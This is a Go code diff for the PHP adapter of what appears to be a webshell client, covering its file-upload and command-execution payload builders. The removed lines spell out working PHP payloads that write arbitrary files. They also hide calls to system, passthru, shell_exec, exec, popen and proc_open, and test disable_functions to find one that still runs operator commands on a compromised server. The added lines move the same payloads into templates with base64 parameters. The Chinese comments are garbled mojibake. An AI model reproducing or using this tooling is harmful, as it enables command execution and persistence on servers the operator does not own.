@@ -1,4 +1,4 @@
-﻿package php
+package php
 
 import (
 	"context"
@@ -179,32 +179,24 @@ func (p *phpFileUpload) WithAppend(on bool) *phpFileUpload {
 
 func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
-
-	remoteB64 := b64(p.remote)
-	contentB64 := b64(string(p.content))
-
-	// �԰��� PHP Դ�룺��·�������ݶ� base64 ������eval ����д���ļ���
+	code, placeholders := p.tpl.FileUpload()
 	flag := "w"
 	if p.append {
 		flag = "a"
 	}
-	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
-	code := b64S + ";" +
-		"$p=" + b64R + "('" + remoteB64 + "');" +
-		"$c=" + b64R + "('" + contentB64 + "');" +
-		"$f=@fopen($p,'" + flag + "');" +
-		"if($f===false){echo \"0\";exit;}" +
-		"$n=@fwrite($f,$c);" +
-		"@fclose($f);" +
-		"if($n===false||$n!==strlen($c)){echo \"0\";}else{echo \"1\";}"
-
-	_ = p.tpl // �������ñ��� unused
-
+	code = strings.Replace(code, `"w"`, `"` + flag + `"`, 1)
+	for key, ph := range placeholders {
+		switch ph {
+		case placeholderBase64Path:
+			req.SetParam(key, []byte(b64(p.remote)))
+		case placeholderBase64Content:
+			req.SetParam(key, []byte(b64(string(p.content))))
+		}
+	}
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
 	return req, nil
 }
-
 func (p *phpFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
 		return nil, errors.New("phpFileUpload.Parse: ��ӦΪ��")
@@ -237,75 +229,30 @@ func (p *phpExec) RiskLevel() core.RiskLevel { return core.RiskExec }
 
 func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
-
-	// �԰���������ֱ�ӰѲ���ֵ base64 ����������� PHP Դ���
-	// �滻 $_POST['xxx'] Ϊ������ base64 �ַ�����
-	// ���� PHP Դ�벻�����κ��ⲿ POST �ֶΣ�eval ����ִ�С�
-	binB64 := b64(p.bin)
-	cmdB64 := b64(p.cmd)
-
-
-
-	// ʹ������ָ�������̶��� |||askey||| / |||asline|||
-	seps := NewSeparators()
-
-	var envStr string
-	if len(p.envars) > 0 {
-		var pairs []string
-		for k, v := range p.envars {
-			pairs = append(pairs, k+seps.KeySep+v)
+	code, placeholders := p.tpl.Exec()
+	for key, ph := range placeholders {
+		switch ph {
+		case placeholderBase64Bin:
+			req.SetParam(key, []byte(b64(p.bin)))
+		case placeholderBase64Cmd:
+			req.SetParam(key, []byte(b64(p.cmd)))
+		case placeholderBase64Env:
+			envStr := ""
+			if len(p.envars) > 0 {
+				seps := NewSeparators()
+				var pairs []string
+				for k, v := range p.envars {
+					pairs = append(pairs, k+seps.KeySep+v)
+				}
+				envStr = joinLines(pairs, seps.LineSep)
+			}
+			req.SetParam(key, []byte(b64(envStr)))
 		}
-		envStr = joinLines(pairs, seps.LineSep)
 	}
-		envB64 := b64(envStr)
-
-	// �����԰��� PHP Դ�룺�� base64_decode($_POST['xxx']) �滻��
-	// base64_decode('xxx')���� eval ֱ���õ�������ֵ��
-	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
-	sysS, sysR := obfuscatedFuncSubstr("system")
-	psS, psR := obfuscatedFuncSubstr("passthru")
-	seS, seR := obfuscatedFuncSubstr("shell_exec")
-	exS, exR := obfuscatedFuncSubstr("exec")
-	poS, poR := obfuscatedFuncSubstr("popen")
-	prS, prR := obfuscatedFuncSubstr("proc_open")
-
-	code := "" +
-		b64S + ";" + sysS + ";" + psS + ";" + seS + ";" + exS + ";" + poS + ";" + prS + ";" +
-		"$p=" + b64R + "('" + binB64 + "');" +
-		"$s=" + b64R + "('" + cmdB64 + "');" +
-		"$envstr=@" + b64R + "('" + envB64 + "');" +
-		"$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
-		"$c=(substr($d,0,1)=='/')?'-c ' . '\"' . $s . '\"' : '/c ' . '\"' . $s . '\"';" +
-		"if(substr($d,0,1)=='/'){" +
-		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
-		"}else{" +
-		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
-		"}" +
-		"if(!empty($envstr)){$envarr=explode('" + seps.LineSep + "',$envstr);foreach($envarr as $v){if(!empty($v)){@putenv(str_replace('" + seps.KeySep + "','=',$v));}}}" +
-		"$r=$p.' '.$c;" +
-		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
-		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
-		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));}" +
-		"function runcmd($c){global " + sysR + "," + psR + "," + seR + "," + exR + "," + poR + "," + prR + ";$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
-		"if(fe(" + sysR + ")){@" + sysR + "($c,$ret);}" +
-		"elseif(fe(" + psR + ")){@" + psR + "($c,$ret);}" +
-		"elseif(fe(" + seR + ")){print(@" + seR + "($c));}" +
-		"elseif(fe(" + exR + ")){@" + exR + "($c,$o,$ret);print(join(\"\\n\",$o));}" +
-		"elseif(fe(" + poR + ")){$fp=@" + poR + "($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
-		"elseif(fe(" + prR + ")){$p=@" + prR + "($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);@stream_set_blocking($io[1],0);@stream_set_blocking($io[2],0);$ox='';$ey='';while(!@feof($io[1])||!@feof($io[2])){$r=array($io[1],$io[2]);$w=null;$x=null;if(@stream_select($r,$w,$x,null)){if(in_array($io[1],$r))$ox.=@fread($io[1],8192);if(in_array($io[2],$r))$ey.=@fread($io[2],8192);}}@fclose($io[1]);@fclose($io[2]);@proc_close($p);echo $ox;if($ey!=''){echo 'STDERR:'.$ey;}$ret=0;}" +
-		"else{$ret=127;}" +
-		"return $ret;}" +
-		"$ret=@runcmd($r);" +
-		"if($ret!=0){echo 'ret=' . $ret;}"
-
-	_ = p.tpl // �������ñ��� unused
-
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
 	return req, nil
 }
-
-// WithBin ָ����Ĭ�� shell ·�������� C:\Windows\system32\cmd.exe����
 func (p *phpExec) WithBin(bin string) *phpExec {
 	p.bin = bin
 	return p
